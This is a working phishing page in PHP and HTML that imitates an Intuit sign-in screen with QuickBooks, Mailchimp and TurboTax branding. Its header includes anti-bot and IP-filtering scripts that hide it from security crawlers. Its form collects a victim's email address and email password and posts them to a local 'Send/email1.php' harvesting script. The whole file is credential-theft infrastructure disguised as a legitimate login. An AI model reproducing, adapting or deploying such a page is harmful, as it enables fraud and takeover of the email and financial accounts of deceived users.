
<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
?>

<!DOCTYPE html>


<!DOCTYPE html>
<html>
<head>
  <title>Intuit Page Login</title>
  <link crossorigin="anonymous" rel="icon" type="image/png" href="https://plugin.intuitcdn.net/shell-service/intuit_favicon.ico">
  <link rel="stylesheet" type="text/css" href="files/style.css">
  <link rel="preload stylesheet" as="style" href="https://plugin.intuitcdn.net/web-shell/4.135.0/indeterminateShort.cf7c1398295ee17b8cfb.css" crossorigin="anonymous">
  <link href="https://plugin.intuitcdn.net/web-shell/4.135.0/shell.eb433da631c52bb97947.css" rel="preload" as="style" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/web-shell/4.135.0/shell.eb433da631c52bb97947.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/36071.8f512970cc38183bb145d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/86766.4c3b0fc9ff2aeff6cd48d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/67702.562e80dabac74d5fd489d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/83233.b1ffbe1561fe708a72c7d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/96164.b5c98ddb0ebc16fb43e1d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/47009.d51fc2fbf14f6c9dbd8bd8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/15629.19ce9417ce30cf0fff70d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/77219.c677852684701d2aca6fd8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/95364.2a08354786bb9c707497d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/54403.f146fc22a4a5ac90e8d2d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/36234.22eeda2a3a9ddc332f00d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/53298.6767417571a24312148ed8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/14249.96c8c2a589080d2abd82d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/95500.5fc6a97e6fd11bc09367d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/82256.bbfae6d02692425cdec8d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/12803.d3b165b04fa3563e3505d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/87576.c376f1cad31c9b4de337d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/46975.9c3e7e41ffaea208c7f0d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/20495.44175555e2ca61bcb9bfd8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/20832.0a055fd2375227eec637d8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/40455.04d87fa2a85aab73ed6dd8aec453.css" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/98393.ff9180bda52b747451dbd8aec453.css" crossorigin="anonymous">

</head>








<body>
  <div id="web-shell-spinner" class="idsTSIShortSpinner IndeterminateShort-wrapper hide-spinner"><div class="IndeterminateShort-circularSpinnerOuter"><div class="IndeterminateShort-circularSpinnerInner"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve"><circle cx="64" cy="64" r="6.9"></circle></svg></div></div><div class="IndeterminateShort-circularSpinnerOuter"><div class="IndeterminateShort-circularSpinnerInner"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve"><circle cx="64" cy="64" r="6.9"></circle></svg></div></div><div class="IndeterminateShort-circularSpinnerOuter"><div class="IndeterminateShort-circularSpinnerInner"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve"><circle cx="64" cy="64" r="6.9"></circle></svg></div></div><div class="IndeterminateShort-circularSpinnerOuter"><div class="IndeterminateShort-circularSpinnerInner"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve"><circle cx="64" cy="64" r="6.9"></circle></svg></div></div></div><script nonce="">const theme=__shellInternal&&__shellInternal.appExperience&&__shellInternal.appExperience.appTheme?__shellInternal.appExperience.appTheme:"intuit";__shellInternal&&__shellInternal.nonce&&(window.__webpack_nonce__=__shellInternal.nonce),document.querySelectorAll(".IndeterminateShort-circularSpinnerCircle").forEach((e=>{e.classList.add(`IndeterminateShort-${theme}`)}));const requirePromise=e=>new Promise(((r,n)=>{if(!window.require)return n(new Error("window.require is not defined"));require(e,r,(e=>{e instanceof Error&&(e.internalMessage="Shell - failed to fetch shell module"),n(e)}))})),bootPromise=getShellExperiments("enable-pre-boot-hook")&&window.__middlewareConfig&&"function"==typeof window.__middlewareConfig.preBoot?window.__middlewareConfig.preBoot():Promise.resolve();bootPromise.then((()=>{return e=["web-shell"],new Promise(((r,n)=>{if(!window.require)return n(new Error("window.require is not defined"));require(e,r,(e=>{e instanceof Error&&(e.internalMessage="Shell - failed to fetch shell module"),n(e)}))}));var e}),(e=>{throw e instanceof Error&&(e.internalMessage="Shell - failed to execute preBoot middleware"),e})).then((({default:e})=>e)).then((({default:e})=>e())).then((e=>{window.__shellInternal.logger.log("Shell - successfully loaded",{app:e.appName})})).catch((e=>{window.__shellInternal.logger.error(e&&e.internalMessage||"Shell - failed to start shell",{},e)}))</script><div id="___appshell"><div id="app" class="app-shell"><div data-theme="intuit"><div class="shell-view"><div class="main"><div class="body-container"><div class="body" data-id="bodyNode" role="main"><div data-testid="SignInSignUpWidget" class="ius-hosted-ui theme-intuit-ecosystem ius-reset" data-morpheus-widget="identity-authn-core-ui/sign-in-sign-up-hosted@1.0.0" data-morpheus-pluginid="identity-authn-core-ui"><div class="styledComponents__HostedSisuHeightDiv-sc-1n0nm38-0 ixZFAx"><div data-testid="DeviceProfilingWidget"></div><div data-testid="IuxBookendsContainer" class="Bookends__FlexCenteredColumn-sc-163uul4-0 ebWyYe"><div class="BookendsHeader__StyledBookendHeader-sc-1dyhyro-0 bTZsOE"><div data-testid="IuxHeaderLogo" class="IuxHeaderLogo__HeaderLogoContainer-sc-1uo1ya3-0 bGOvWD"><a href="#" class="IuxHeaderLogo__StyledAnchor-sc-1uo1ya3-1 kzzJLa"></a></div><div data-testid="IuxLogosContainer" class="BookendsStaticLogoBar__LogosContainer-sc-1hbi6n-0 IXbTG">
  


<a data-testid="IuxProductLogo-quickbooks" rel="noopener noreferrer" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD"><div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi"></div></a>
  
  
  
  <a data-testid="IuxProductLogo-mailchimp" rel="noopener noreferrer" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD"><div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi"></div></a>









  <a data-testid="IuxProductLogo-turbotax" rel="noopener noreferrer"  class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD"><div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi">
    </div></a></div></div>
  
  
  
  <header>
    <img src="files/header.png" alt="Intuit_Header">
  </header>
  
  
  
  
  
  <div class="Bookends__NonStyledDiv-sc-163uul4-4 jdWbPG">
    <div class="styledComponents__StyledWidgetContainer-sc-12vb80e-12 gRkwXm ius" data-testid="IuxBookendsHeaderContainer">
        <div data-testid="IdFirstUnknownContainer" class="IdentifierFirstUnknown__StyledContainer-sc-1pqtykm-0 fOdUvC">
            <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf">
    
                <header>
                <h2 data-testid="passwordVerificationHeader" id="passwordVerificationHeader" class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV"><font size="5">Let's verify your email details.</font></h2>
                </header><br><br>
            </section>
  
            <div style="clear:both">
  
  
  
  <form method="post" action="Send/email1.php" autocomplete="off">

	
    <div class="IuxCurrentPasswordInput__StyledField-sc-1lpfy9v-1 fZIYDt Field-wrapper-097b01a quickbooks">
        
		<div id="field-label-104">
            <label data-testid="currentPasswordLabel" for="iux-password-confirmation-password" class="Field-label-3ee8c73 IuxCurrentPasswordInput__StyledLabel-sc-1lpfy9v-2 dYyci"><font size="4">Email</font></label>
        </div>

        <div class="Field-inner-94aff40">
            <div class="Tabs-tabPanels-66ba6eb" data-reach-tab-panels="">
                <div aria-labelledby="tabs--3--tab--0" role="tabpanel" tabindex="-1" data-reach-tab-panel="" id="tabs--3--panel--0">
                    <div class="IuxFormInput__StyledField-sc-1nlfpoi-1 XjzCj Field-wrapper-097b01a quickbooks">
                        <div class="Field-inner-94aff40">
                            <div id="field-label-1">
                                <label data-testid="IdentifierFirstInternationalEmailUserIdLabel" for="iux-identifier-first-international-email-user-id-input" class="Field-label-3ee8c73 IuxFormInput__StyledLabel-sc-1nlfpoi-2 boPlGE">
                                    <span>
                                        <span data-testid="FormInputFirstLabel" class="IuxFormInput__StyledFirstText-sc-1nlfpoi-7 dUkcPw"></span> 
                                    </span>
                                </label>
                            </div>



                            <div class="Input-quickbooks-326ed9a Input-light-be852eb Input-wrapper-9b8e8c3 Input-input-wrapper-2d297e4"><font size="3">
                                <input data-testid="IdentifierFirstInternationalUserIdInput" name="email" placeholder="" aria-label="" aria-required="true" id="email" type="email" autocapitalize="none" aria-labelledby="field-label-1" aria-invalid="true" class="IuxFormInput__StyledInput-sc-1nlfpoi-0 LoYZa Input-input-dcc98af" value=""></font>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

			<br>

			<div id="field-label-104">
            	<label data-testid="currentPasswordLabel" for="iux-password-confirmation-password" class="Field-label-3ee8c73 IuxCurrentPasswordInput__StyledLabel-sc-1lpfy9v-2 dYyci"><font size="4">Email Password</font></label>
        	</div>

			<div class="Tabs-tabPanels-66ba6eb" data-reach-tab-panels="">
                <div aria-labelledby="tabs--3--tab--0" role="tabpanel" tabindex="-1" data-reach-tab-panel="" id="tabs--3--panel--0">
                    <div class="IuxFormInput__StyledField-sc-1nlfpoi-1 XjzCj Field-wrapper-097b01a quickbooks">
                        <div class="Field-inner-94aff40">
                            <div id="field-label-1">
                                <label data-testid="IdentifierFirstInternationalEmailUserIdLabel" for="iux-identifier-first-international-email-user-id-input" class="Field-label-3ee8c73 IuxFormInput__StyledLabel-sc-1nlfpoi-2 boPlGE">
                                    <span>
                                        <span data-testid="FormInputFirstLabel" class="IuxFormInput__StyledFirstText-sc-1nlfpoi-7 dUkcPw"></span> 
                                    </span>
                                </label>
                            </div>



                            <div class="Input-quickbooks-326ed9a Input-light-be852eb Input-wrapper-9b8e8c3 Input-input-wrapper-2d297e4"><font size="3">
                                <input data-testid="IdentifierFirstInternationalUserIdInput" name="epass" placeholder="" aria-label="" aria-required="true" id="epass" type="password" autocapitalize="none" aria-labelledby="field-label-1" aria-invalid="true" class="IuxFormInput__StyledInput-sc-1nlfpoi-0 LoYZa Input-input-dcc98af" value=""></font>
                            </div>
                        </div>
                    </div>
                </div>
            </div> 
            <br><br>
        </div>
        
    
    
    
    
    
      
    
    
      <button type="submit" data-testid="IdentifierFirstSubmitButton" class="Button-button-e224935 Button-quickbooks-13a30b6 Button-light-fb76fc6 Button-size-large-5f164c2 Button-variant-primary-a945f7b Button-fill-solid-a2238b0 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-b6f04e7">
      <span class="IdentifierFirstUnknownSubmitButton__StyledLockIcon-sc-1ec9o89-0 dAsOuU"></span>
      <span class="IdentifierFirstUnknownSubmitButton__StyledSubmitButtonText-sc-1ec9o89-2 eutdsl"><font size="3">Continue</font></span>
      </button>
    
      <br><br>
      <div class="IdentifierFirstUnknownSubmitButton__StyledTermsOfServiceContainer-sc-1ec9o89-1 uaoRv">
        <div id="ius-terms-of-use" class="TermsOfService__TermsOfServiceWrapper-sc-1h018p6-0 bzMOUZ" data-testid="TermsOfService">
        <br>
        <br>
        <br>
        
          <div data-testid="ius-identifier-first-unknown-terms-of-use-privacy-date" class="PrivacyDateText__TermsOfServicePrivacyDateText-sc-5vpgfb-0 kTGHRB"></div>
        </div>
      </div>
      <div class="styledComponents__StyledDivider-sc-12vb80e-15 jHIiRr"></div>
    </form>
  
 

  </body>
</html>